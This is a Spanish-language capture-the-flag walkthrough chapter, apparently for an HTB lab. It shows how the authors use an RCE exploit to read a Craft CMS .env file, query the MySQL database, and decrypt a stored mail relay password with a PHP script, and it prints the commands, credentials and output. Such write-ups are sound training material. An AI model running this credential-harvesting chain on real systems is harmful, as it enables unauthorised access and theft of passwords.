# 4 · Credential Access: Unsecured Credentials  (T1552.001)

**Objetivo:** conseguir una credencial *reutilizable* de un usuario real (resultó ser `aporter`).

## 4.1 · Cómo pensamos

`www-data` es un usuario de servicio sin shell útil; necesitamos escalar a un usuario **humano**.

> *"¿Dónde guarda una app web sus secretos?"* → archivos de configuración y base de datos.

## 4.2 · Lo que hicimos (razonar → deducir → testear → concluir)

!!! info "Todo corre a través del RCE de la Táctica 3"
    No hay shell interactivo: **cada comando lo lanzamos con el exploit**, que ejecuta **uno** y
    devuelve su salida. Para no repetir la invocación entera, la abreviamos:
    ```bash
    RCE(){ python3 cve_2026_44011.py -b http://portal.international.htb \
                   -u jenny -p 'Fl1ghtDeck2026!' -c "$1"; }
    ```
    Desde aquí, `RCE '<comando>'` = *"ejecuta esto como www-data y enséñame la salida"*.

1. **Leer el `.env`** de la app (ahí viven los secretos de Craft):
   ```bash
   RCE 'cat /var/www/portal/.env'
   ```
   ```text
   CRAFT_APP_ID=CraftCMS--41606de1-cf7a-4fc5-8b1e-6f746d801adf
   CRAFT_ENVIRONMENT=production
   CRAFT_SECURITY_KEY=IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr      ← la llave que descifra
   CRAFT_DB_SERVER=127.0.0.1
   CRAFT_DB_PORT=3306
   CRAFT_DB_DATABASE=craft
   CRAFT_DB_USER=craftuser
   CRAFT_DB_PASSWORD=CraftDB_pw_2026                        ← creds de la BD
   CRAFT_DB_TABLE_PREFIX=
   ```

2. **Consultar la BD** con esas credenciales → la tabla *custom* `htbairways_settings` guarda una
   contraseña de relay de correo **cifrada** de `aporter`:
   ```bash
   RCE 'mysql -ucraftuser -pCraftDB_pw_2026 craft -e "SELECT * FROM htbairways_settings"'
   ```
   ```text
   id  name               value
   1   mailRelayPassword  u0E7OgbBeWhhPn1Hajs…Nl5w=    ← cifrado (base64)
   2   mailRelayHost      mail.htbairways.htb
   3   mailRelayPort      587
   4   mailRelayUser      aporter                      ← el usuario objetivo
   ```

3. **Descifrarla.** El `mailRelayPassword` es un blob cifrado; la `CRAFT_SECURITY_KEY` del `.env` lo
   abre con la función nativa de Yii.

   ??? question "¿Cómo sabes que el script de descifrado es ESE? (clic)"
       No se adivina, se **deduce**: **(1)** es *cifrado*, no *hash* — un hash es irreversible, pero
       esto es un blob base64 y la app necesita la contraseña **en claro** para enviar correo → tiene
       que ser cifrado **reversible**. **(2)** ¿quién lo cifró? la propia app: léelo en su código por
       el RCE con `RCE 'grep -rn encryptByKey /var/www/portal --include=*.php'` → verás que usa
       `Craft::$app->getSecurity()->encryptByKey()` (que es el `yii\base\Security` de Yii2) con la
       `CRAFT_SECURITY_KEY` como llave. **(3)** descifrar es el **inverso**:
       `Security::decryptByKey(base64_decode($blob), $key)`, con la misma key. Eso **es** `decrypt.php`.

   **(a)** Crea `decrypt.php` con un editor (`nano decrypt.php`) — es **PHP**:
   ```php
   <?php
   require '/var/www/portal/vendor/autoload.php';
   $key = 'IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr';     // CRAFT_SECURITY_KEY (del .env)
   $c   = 'u0E7OgbBeWhhPn1HajsFMDg0ZDJhNzUwZTUyNGMxYjBlZDk0MGFkZWE5MmEyMzc0ZjhmMmM4OGNiNTRiNDAzZTA2YWFjM2U5OWU2YWIzMGUPrGNmIwqUOPL3Y0gahxRF5wvwsBHdA3Pf4+d1XnQ4I3W/cqDF7Pr/58qVfPoNl5w=';  // mailRelayPassword completo (paso 2)
   echo (new yii\base\Security)->decryptByKey(base64_decode($c), $key), "\n";
   ```

   **(b)** Codifícalo en base64 y deja que el RCE lo ejecute en el servidor (se envía a `php` por una
   tubería; sin archivos temporales ni comillas conflictivas):
   ```bash
   B64=$(base64 -w0 decrypt.php)
   RCE "echo $B64 | base64 -d | php"
   ```
   ```text
   [+] Login successful
   Craft version: 5.9.8
   …
   [+] Command output callback received
   command exit code: 0
   command output:
   Skyp0rt_Relay!26
   ```

4. Resultado: **`aporter : Skyp0rt_Relay!26`**.

## 4.3 · Conclusión + lección

!!! warning "La lección central"
    Guardar el dato cifrado **junto a** la llave que lo abre no es seguridad, es **ofuscación**.
    Si controlas el servidor, tienes ambos → descifras.

**Siguiente:** [Táctica 5 · Lateral Movement](05-lateral.md)
